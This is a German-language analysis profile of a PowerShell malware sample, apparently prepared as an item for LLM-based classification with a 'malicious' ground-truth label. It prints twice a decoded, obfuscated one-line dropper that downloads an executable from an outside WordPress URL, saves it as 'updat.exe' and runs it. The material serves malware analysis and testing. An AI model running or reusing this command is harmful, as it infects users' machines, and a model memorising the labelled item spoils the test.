# Steckbrief: 0e6dc96deab61e32f179b79b187defb3997a7779f7fb20026c09930af3c9de1e.ps1

- SHA256: `0e6dc96deab61e32f179b79b187defb3997a7779f7fb20026c09930af3c9de1e`
- Groesse: 878 Bytes, 1 Zeilen
- Ground-Truth-Label (aus Ordner): **malicious**
- Kein Urteil enthalten. Bewertung erfolgt durch das LLM.

## Stufe 1 - Reine Extraktion
- Strings gesamt: 0 (Auszug unten)
- Base64-Bloecke gesamt: 1, davon dekodierbar: 1
- Dekodierter Base64-Block (Laenge 784):
  ```
  [nET.sERVIcePoIntMaNAGEr]::seCuRitYproToCOL = 	[Net.sEcuriTyprOTocOltYpe]::Tls12 	; 	  iRM 	-Uri 	(”http://ozzyingilizce.com/wp-content/sgu/7”    +  ”6151980860”    +  ”8”    +  ”38230799922.ex”    +  ”e”  )  -OuTFiLE 	”$ENV:UsERprOfile\updat.exe”  ;  iNVoke-item 	”$ENv:USeRPRofilE\updat.exe”
  ```

## Stufe 2 - Statische Merkmale (zusaetzlich)
- Auffaellige Tokens (Name: Vorkommen):
  - noprofile: 1

## Stufe 3 - Struktur (zusaetzlich)
- Dekodierte Befehle (Auszug):
  ```
  [nET.sERVIcePoIntMaNAGEr]::seCuRitYproToCOL = 	[Net.sEcuriTyprOTocOltYpe]::Tls12 	; 	  iRM 	-Uri 	(”http://ozzyingilizce.com/wp-content/sgu/7”    +  ”6151980860”    +  ”8”    +  ”38230799922.ex”    +  ”e”  )  -OuTFiLE 	”$ENV:UsERprOfile\updat.exe”  ;  iNVoke-item 	”$ENv:USeRPRofilE\updat.exe”
  ```
